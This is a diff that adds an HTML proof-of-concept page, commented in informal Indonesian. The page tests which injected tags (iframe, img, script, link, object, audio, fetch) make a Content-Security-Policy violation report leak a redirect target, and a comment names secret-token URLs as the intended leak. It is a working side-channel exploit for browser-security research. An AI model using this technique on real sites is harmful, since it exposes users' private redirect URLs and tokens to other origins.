@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline'; img-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self'; object-src 'none';">
+    <title>CSP Leak Multi-Component PoC</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; }
+        .log { background: #f4f4f4; padding: 10px; border-left: 4px solid #d9534f; margin-bottom: 10px; font-family: monospace; word-break: break-all;}
+        #hiddenContainer { display: none; }
+    </style>
+</head>
+<body>
+
+    <h2>Test Content Security Policy (CSP) Leaks</h2>
+    <p>Script ini bakal nge-inject berbagai macam tag HTML buat ngecek tag mana aja yang ngebocorin alamat redirect.</p>
+    
+    <button id="exploitBtn" style="padding: 10px 20px; cursor: pointer;">Run All Tests</button>
+    
+    <div style="margin-top: 20px;">
+        <h3>Violation Logs:</h3>
+        <div id="status">Waiting for user action...</div>
+    </div>
+
+    <div id="hiddenContainer"></div>
+
+    <script>
+        const statusDiv = document.getElementById('status');
+        const container = document.getElementById('hiddenContainer');
+
+        // Target URL: Di server Python lo, bikin endpoint ini redirect ke URL rahasia/external
+        // Contoh: http://localhost:8000/redirect -> Location: https://target.com/secret-token
+        const targetUrl = "https://fb.com"; 
+
+        // Listener buat nangkep laporan satpam (CSP)
+        document.addEventListener('securitypolicyviolation', (e) => {
+            // Kita log Tag apa yang bikin masalah, dan URL apa yang bocor
+            const tagName = e.target ? e.target.tagName : 'API/Fetch';
+            
+            const logEntry = document.createElement('div');
+            logEntry.className = 'log';
+            logEntry.innerHTML = `
+                <b>Trigger:</b> <code>&lt;${tagName}&gt;</code><br>
+                <b>Directive:</b> ${e.violatedDirective}<br>
+                <b>LEAKED URI:</b> <span style="color:red; font-weight:bold;">${e.blockedURI}</span>
+            `;
+            statusDiv.appendChild(logEntry);
+            console.log(`[${tagName}] Violation object:`, e);
+        });
+
+        document.getElementById('exploitBtn').addEventListener('click', () => {
+            statusDiv.innerHTML = ""; // Bersihin log lama
+            container.innerHTML = ""; // Bersihin element lama
+
+            // 1. Iframe Test
+            const iframe = document.createElement('iframe');
+            iframe.src = targetUrl;
+            container.appendChild(iframe);
+
+            // 2. Image Test
+            const img = document.createElement('img');
+            img.src = targetUrl;
+            container.appendChild(img);
+
+            // 3. Script Test
+            const script = document.createElement('script');
+            script.src = targetUrl;
+            container.appendChild(script);
+
+            // 4. Stylesheet (Link) Test
+            const link = document.createElement('link');
+            link.rel = "stylesheet";
+            link.href = targetUrl;
+            container.appendChild(link);
+
+            // 5. Object Test (Biasanya buat Flash/PDF, ini ketat banget aturan CSP-nya)
+            const obj = document.createElement('object');
+            obj.data = targetUrl;
+            container.appendChild(obj);
+
+            // 6. Audio/Video (Media) Test
+            const audio = document.createElement('audio');
+            audio.src = targetUrl;
+            container.appendChild(audio);
+
+            // 7. Fetch API Test (JavaScript request langsung)
+            fetch(targetUrl, { mode: 'no-cors' }).catch(err => console.log("Fetch failed naturally"));
+        });
+    </script>
+
+</body>
+</html>
